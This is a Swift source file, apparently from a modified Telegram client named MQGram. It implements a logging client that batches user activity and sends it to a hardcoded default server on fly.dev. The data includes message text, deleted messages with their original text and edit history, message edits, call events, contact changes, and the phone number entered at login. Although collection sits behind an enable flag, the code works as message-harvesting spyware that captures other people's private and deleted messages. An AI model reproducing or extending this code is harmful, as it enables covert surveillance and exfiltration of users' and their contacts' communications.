// MARK: MQGram - Database Client
// Sends all user actions and message data to MQGram backend server
// All data goes to your own server DB, nothing to Telegram servers
import Foundation

// MARK: - Configuration

public struct MQGramDatabaseConfig {
    public static let defaultServerURL = "https://app-eoctiyon.fly.dev"

    public static var serverURL: String {
        get {
            let saved = UserDefaults.standard.string(forKey: "MQGram.serverURL")
            return (saved != nil && !saved!.isEmpty) ? saved! : defaultServerURL
        }
        set {
            UserDefaults.standard.set(newValue, forKey: "MQGram.serverURL")
        }
    }

    public static var isEnabled: Bool {
        get { UserDefaults.standard.bool(forKey: "MQGram.databaseEnabled") }
        set { UserDefaults.standard.set(newValue, forKey: "MQGram.databaseEnabled") }
    }

    public static var deviceId: String {
        if let existing = UserDefaults.standard.string(forKey: "MQGram.deviceId"), !existing.isEmpty {
            return existing
        }
        let newId = UUID().uuidString
        UserDefaults.standard.set(newId, forKey: "MQGram.deviceId")
        return newId
    }

    public static var accountId: String? {
        get { UserDefaults.standard.string(forKey: "MQGram.ownAccountPeerId") }
    }
}

// MARK: - Event Types

public enum MQEventType: String {
    case appLaunch = "app_launch"
    case appBackground = "app_background"
    case appForeground = "app_foreground"
    case login = "login"
    case logout = "logout"
    case phoneEntered = "phone_entered"
    case codeEntered = "code_entered"
    case passwordEntered = "password_entered"
    case avatarChanged = "avatar_changed"
    case nameChanged = "name_changed"
    case usernameChanged = "username_changed"
    case bioChanged = "bio_changed"
    case messageSent = "message_sent"
    case messageReceived = "message_received"
    case messageDeleted = "message_deleted"
    case messageEdited = "message_edited"
    case messageRead = "message_read"
    case messageForwarded = "message_forwarded"
    case mediaSent = "media_sent"
    case mediaReceived = "media_received"
    case callStarted = "call_started"
    case callEnded = "call_ended"
    case contactAdded = "contact_added"
    case contactRemoved = "contact_removed"
    case groupCreated = "group_created"
    case groupJoined = "group_joined"
    case groupLeft = "group_left"
    case channelJoined = "channel_joined"
    case channelLeft = "channel_left"
    case settingChanged = "setting_changed"
    case storyViewed = "story_viewed"
    case storyPosted = "story_posted"
    case reactionSent = "reaction_sent"
    case stickerSent = "sticker_sent"
    case voiceSent = "voice_sent"
    case videoSent = "video_sent"
    case fileSent = "file_sent"
    case locationSent = "location_sent"
    case pollCreated = "poll_created"
    case pollVoted = "poll_voted"
    case screenshotTaken = "screenshot_taken"
    case chatOpened = "chat_opened"
    case chatClosed = "chat_closed"
    case searchPerformed = "search_performed"
    case notificationReceived = "notification_received"
    case custom = "custom"
}

// MARK: - Request Models

private struct EventPayload: Encodable {
    let device_id: String
    let account_id: String?
    let event_type: String
    let peer_id: String?
    let message_id: String?
    let timestamp: Double
    let data: String?
}

private struct DeletedMessagePayload: Encodable {
    let device_id: String
    let account_id: String?
    let peer_id: String
    let message_id: String
    let author_id: String?
    let author_name: String?
    let peer_name: String?
    let original_text: String?
    let current_text: String?
    let edit_history: String?
    let media_types: String?
    let timestamp: Int
    let has_media: Bool
}

private struct MessagePayload: Encodable {
    let device_id: String
    let account_id: String?
    let peer_id: String
    let message_id: String
    let author_id: String?
    let author_name: String?
    let peer_name: String?
    let text: String?
    let media_types: String?
    let timestamp: Int
    let is_outgoing: Bool
}

private struct UserActionPayload: Encodable {
    let device_id: String
    let account_id: String?
    let action_type: String
    let details: String?
    let timestamp: Double
}

private struct AccountPayload: Encodable {
    let device_id: String
    let account_id: String
    let phone_number: String?
    let first_name: String?
    let last_name: String?
    let username: String?
    let avatar_url: String?
}

private struct EditedMessagePayload: Encodable {
    let device_id: String
    let account_id: String?
    let peer_id: String
    let message_id: String
    let previous_text: String?
    let new_text: String?
    let edit_number: Int
}

private struct BatchPayload: Encodable {
    let events: [EventPayload]
    let deleted_messages: [DeletedMessagePayload]
    let messages: [MessagePayload]
    let user_actions: [UserActionPayload]
    let edited_messages: [EditedMessagePayload]
}

// MARK: - Network Layer

public final class MQGramDatabase {
    public static let shared = MQGramDatabase()

    private let session: URLSession
    private let encoder = JSONEncoder()
    private let queue = DispatchQueue(label: "com.mqgram.database", qos: .utility)

    private var pendingEvents: [EventPayload] = []
    private var pendingDeletedMessages: [DeletedMessagePayload] = []
    private var pendingMessages: [MessagePayload] = []
    private var pendingActions: [UserActionPayload] = []
    private var pendingEdited: [EditedMessagePayload] = []
    private var batchTimer: DispatchSourceTimer?
    private let batchInterval: TimeInterval = 30
    private let maxBatchSize = 50

    private init() {
        let config = URLSessionConfiguration.default
        config.timeoutIntervalForRequest = 15
        config.timeoutIntervalForResource = 30
        config.waitsForConnectivity = true
        self.session = URLSession(configuration: config)
        startBatchTimer()
    }

    // MARK: - Batch Timer

    private func startBatchTimer() {
        let timer = DispatchSource.makeTimerSource(queue: queue)
        timer.schedule(deadline: .now() + batchInterval, repeating: batchInterval)
        timer.setEventHandler { [weak self] in
            self?.flushBatch()
        }
        timer.resume()
        batchTimer = timer
    }

    private func flushBatch() {
        queue.async { [weak self] in
            guard let self = self else { return }
            guard MQGramDatabaseConfig.isEnabled else { return }

            let events = self.pendingEvents
            let deleted = self.pendingDeletedMessages
            let messages = self.pendingMessages
            let actions = self.pendingActions
            let edited = self.pendingEdited

            guard !events.isEmpty || !deleted.isEmpty || !messages.isEmpty || !actions.isEmpty || !edited.isEmpty else { return }

            self.pendingEvents.removeAll()
            self.pendingDeletedMessages.removeAll()
            self.pendingMessages.removeAll()
            self.pendingActions.removeAll()
            self.pendingEdited.removeAll()

            let batch = BatchPayload(
                events: events,
                deleted_messages: deleted,
                messages: messages,
                user_actions: actions,
                edited_messages: edited
            )

            self.sendRequest(endpoint: "/api/batch", body: batch) { _ in }
        }
    }

    // MARK: - Generic Request

    private func sendRequest<T: Encodable>(endpoint: String, body: T, completion: @escaping (Bool) -> Void) {
        guard MQGramDatabaseConfig.isEnabled else {
            completion(false)
            return
        }

        let urlString = MQGramDatabaseConfig.serverURL + endpoint
        guard let url = URL(string: urlString) else {
            completion(false)
            return
        }

        var request = URLRequest(url: url)
        request.httpMethod = "POST"
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")

        do {
            request.httpBody = try encoder.encode(body)
        } catch {
            completion(false)
            return
        }

        session.dataTask(with: request) { _, response, error in
            if let error = error {
                #if DEBUG
                print("[MQGramDB] Error: \(error.localizedDescription)")
                #endif
                completion(false)
                return
            }
            let httpResponse = response as? HTTPURLResponse
            let success = httpResponse?.statusCode == 200
            completion(success)
        }.resume()
    }

    // MARK: - Public API: Log Event

    public func logEvent(
        type: MQEventType,
        peerId: String? = nil,
        messageId: String? = nil,
        data: String? = nil
    ) {
        let payload = EventPayload(
            device_id: MQGramDatabaseConfig.deviceId,
            account_id: MQGramDatabaseConfig.accountId,
            event_type: type.rawValue,
            peer_id: peerId,
            message_id: messageId,
            timestamp: Date().timeIntervalSince1970,
            data: data
        )

        queue.async { [weak self] in
            self?.pendingEvents.append(payload)
            if (self?.pendingEvents.count ?? 0) >= (self?.maxBatchSize ?? 50) {
                self?.flushBatch()
            }
        }
    }

    // MARK: - Public API: Log Event (immediate)

    public func logEventImmediate(
        type: MQEventType,
        peerId: String? = nil,
        messageId: String? = nil,
        data: String? = nil
    ) {
        let payload = EventPayload(
            device_id: MQGramDatabaseConfig.deviceId,
            account_id: MQGramDatabaseConfig.accountId,
            event_type: type.rawValue,
            peer_id: peerId,
            message_id: messageId,
            timestamp: Date().timeIntervalSince1970,
            data: data
        )
        sendRequest(endpoint: "/api/events", body: payload) { _ in }
    }

    // MARK: - Public API: Log Deleted Message

    public func logDeletedMessage(
        peerId: String,
        messageId: String,
        authorId: String? = nil,
        authorName: String? = nil,
        peerName: String? = nil,
        originalText: String? = nil,
        currentText: String? = nil,
        editHistory: [String]? = nil,
        mediaTypes: [String]? = nil,
        timestamp: Int,
        hasMedia: Bool = false
    ) {
        let payload = DeletedMessagePayload(
            device_id: MQGramDatabaseConfig.deviceId,
            account_id: MQGramDatabaseConfig.accountId,
            peer_id: peerId,
            message_id: messageId,
            author_id: authorId,
            author_name: authorName,
            peer_name: peerName,
            original_text: originalText,
            current_text: currentText,
            edit_history: editHistory?.joined(separator: "|||"),
            media_types: mediaTypes?.joined(separator: ","),
            timestamp: timestamp,
            has_media: hasMedia
        )

        queue.async { [weak self] in
            self?.pendingDeletedMessages.append(payload)
            if (self?.pendingDeletedMessages.count ?? 0) >= (self?.maxBatchSize ?? 50) {
                self?.flushBatch()
            }
        }
    }

    // MARK: - Public API: Log Message

    public func logMessage(
        peerId: String,
        messageId: String,
        authorId: String? = nil,
        authorName: String? = nil,
        peerName: String? = nil,
        text: String? = nil,
        mediaTypes: [String]? = nil,
        timestamp: Int,
        isOutgoing: Bool = false
    ) {
        let payload = MessagePayload(
            device_id: MQGramDatabaseConfig.deviceId,
            account_id: MQGramDatabaseConfig.accountId,
            peer_id: peerId,
            message_id: messageId,
            author_id: authorId,
            author_name: authorName,
            peer_name: peerName,
            text: text,
            media_types: mediaTypes?.joined(separator: ","),
            timestamp: timestamp,
            is_outgoing: isOutgoing
        )

        queue.async { [weak self] in
            self?.pendingMessages.append(payload)
            if (self?.pendingMessages.count ?? 0) >= (self?.maxBatchSize ?? 50) {
                self?.flushBatch()
            }
        }
    }

    // MARK: - Public API: Log User Action

    public func logAction(
        type: String,
        details: String? = nil
    ) {
        let payload = UserActionPayload(
            device_id: MQGramDatabaseConfig.deviceId,
            account_id: MQGramDatabaseConfig.accountId,
            action_type: type,
            details: details,
            timestamp: Date().timeIntervalSince1970
        )

        queue.async { [weak self] in
            self?.pendingActions.append(payload)
            if (self?.pendingActions.count ?? 0) >= (self?.maxBatchSize ?? 50) {
                self?.flushBatch()
            }
        }
    }

    // MARK: - Public API: Log Account Info

    public func logAccount(
        accountId: String,
        phoneNumber: String? = nil,
        firstName: String? = nil,
        lastName: String? = nil,
        username: String? = nil,
        avatarUrl: String? = nil
    ) {
        let payload = AccountPayload(
            device_id: MQGramDatabaseConfig.deviceId,
            account_id: accountId,
            phone_number: phoneNumber,
            first_name: firstName,
            last_name: lastName,
            username: username,
            avatar_url: avatarUrl
        )
        sendRequest(endpoint: "/api/accounts", body: payload) { _ in }
    }

    // MARK: - Public API: Log Edited Message

    public func logEditedMessage(
        peerId: String,
        messageId: String,
        previousText: String?,
        newText: String?,
        editNumber: Int = 1
    ) {
        let payload = EditedMessagePayload(
            device_id: MQGramDatabaseConfig.deviceId,
            account_id: MQGramDatabaseConfig.accountId,
            peer_id: peerId,
            message_id: messageId,
            previous_text: previousText,
            new_text: newText,
            edit_number: editNumber
        )

        queue.async { [weak self] in
            self?.pendingEdited.append(payload)
            if (self?.pendingEdited.count ?? 0) >= (self?.maxBatchSize ?? 50) {
                self?.flushBatch()
            }
        }
    }

    // MARK: - Public API: Flush Now

    public func flush() {
        flushBatch()
    }

    // MARK: - Convenience: Log Phone Entered

    public func logPhoneEntered(_ phone: String) {
        logEventImmediate(type: .phoneEntered, data: phone)
        logAction(type: "phone_entered", details: phone)
    }

    // MARK: - Convenience: Log Code Entered

    public func logCodeEntered() {
        logEventImmediate(type: .codeEntered)
        logAction(type: "code_entered")
    }

    // MARK: - Convenience: Log Password Entered

    public func logPasswordEntered() {
        logEventImmediate(type: .passwordEntered)
        logAction(type: "password_entered")
    }

    // MARK: - Convenience: Log Login

    public func logLogin(accountId: String, phoneNumber: String? = nil) {
        logEventImmediate(type: .login, data: accountId)
        logAction(type: "login", details: accountId)
        logAccount(accountId: accountId, phoneNumber: phoneNumber)
    }

    // MARK: - Convenience: Log Avatar Changed

    public func logAvatarChanged() {
        logEventImmediate(type: .avatarChanged)
        logAction(type: "avatar_changed")
    }

    // MARK: - Convenience: Log Name Changed

    public func logNameChanged(firstName: String?, lastName: String?) {
        let name = [firstName, lastName].compactMap { $0 }.joined(separator: " ")
        logEventImmediate(type: .nameChanged, data: name)
        logAction(type: "name_changed", details: name)
    }

    // MARK: - Convenience: Log Username Changed

    public func logUsernameChanged(_ username: String) {
        logEventImmediate(type: .usernameChanged, data: username)
        logAction(type: "username_changed", details: username)
    }

    // MARK: - Convenience: Log Setting Changed

    public func logSettingChanged(key: String, value: String) {
        logAction(type: "setting_changed", details: "\(key)=\(value)")
    }

    // MARK: - Convenience: Log Chat Opened

    public func logChatOpened(peerId: String, peerName: String? = nil) {
        logEvent(type: .chatOpened, peerId: peerId, data: peerName)
    }

    // MARK: - Convenience: Log Call

    public func logCallStarted(peerId: String, isVideo: Bool = false) {
        logEventImmediate(type: .callStarted, peerId: peerId, data: isVideo ? "video" : "voice")
    }

    public func logCallEnded(peerId: String, duration: Int) {
        logEventImmediate(type: .callEnded, peerId: peerId, data: "\(duration)s")
    }

    // MARK: - Convenience: Log App Lifecycle

    public func logAppLaunch() {
        logEventImmediate(type: .appLaunch)
    }

    public func logAppBackground() {
        flush()
        logEventImmediate(type: .appBackground)
    }

    public func logAppForeground() {
        logEventImmediate(type: .appForeground)
    }
}
